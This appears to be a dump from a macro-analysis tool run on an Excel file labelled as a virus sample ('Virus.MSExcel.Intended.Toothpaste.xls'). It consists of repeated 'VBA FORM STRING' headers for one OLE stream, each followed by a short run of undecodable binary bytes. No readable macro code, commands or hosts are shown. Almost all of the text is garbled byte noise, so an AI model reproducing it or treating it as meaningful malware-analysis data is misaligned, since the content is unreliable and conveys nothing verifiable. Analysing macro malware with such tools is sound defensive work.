����f@�F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�c�,GJ��D�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������^p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AK�6�V�T*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�*��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+v�@b��*9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���$��@�1�鳏��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F��;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��V2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[��C)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qi������L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ư���Szw
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`��{���^C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^>��K%r%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�j�U�<˵%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<ŉ��`QgD���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5(U�Jc1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)��Z�[��G@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�S1��h��<�N�`��C>OQ��&)f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�[Š'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�9"�V���mPʼU3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�DK�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
܌ԬB!m�\%b����ӕS���> �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�ţner��){*
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!ͺ�w�,��N�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 <�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��.���.��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C-y���`�}6��u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Su�Q�Z��Ӧ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0Q�و
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-U,(cOP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

e�]��u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�wQ�QAv
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
fm#�y^��0(�{�".�`�B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(ur��P\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V���.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	�)�hp
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��"���fb
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@��̱,l�)Mv��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|!�ܧ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AB�:�1/%��Ң�A�Z�VL
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Uќ�JA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Nb
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0b�dh�#^���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D��luB:S؂��JaZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�m�H����?��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ᣮ�׈I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�UC���*׹�ġ�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R��ꌚ(d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
KNQsj4�y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A���g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"]`��P�Z(]Ýq�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a�L�}e�,�.������!I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�oP���1���wD
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�LiX].��!c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��qx�2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=gQqU*��D��@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q-{̴
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R���9�R���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���BHP�O10c�PD�v�}�*E���+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��0��H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�JJ�
��S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/-9�b���k��Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D�4��%�bn�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ӂ۩H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���,���M�w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�FW<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��wsci|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>eeop�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��X�B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b笊�����pjQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j�mT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ݝ/qywA��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�%�+V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(��t�QX7F"�mqr�pMVHJ�[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1̯("X�@.\\���`Av��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�bg�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���$��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��#�w,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��1�Xac{���c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��MKu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*8X��Iv۸�+*���ڹQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��Y�#�\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[1�F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����M��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#��s�*�]V������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[��.-�)�a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@E��	B�w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ޔ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?�Y��S��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ڕ���2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\V�F|Atw+p���l$@��a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7N��
iQ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|(��@�H���_S��!�7r�ᇪ&^�y� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]��r��f>��Υ*,kg�!6an7�l?`�P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��͟�IX&:f�Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BH�x��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,-�����1ƴC��h���.���2�0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%���ʗ��m_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ζ�,@ ��q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���0([�s93
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?!e�M�V���1�17���^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2��@�G��e~�4T�ip"��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
֤�Ԡ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Oz.�d��/�YO
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
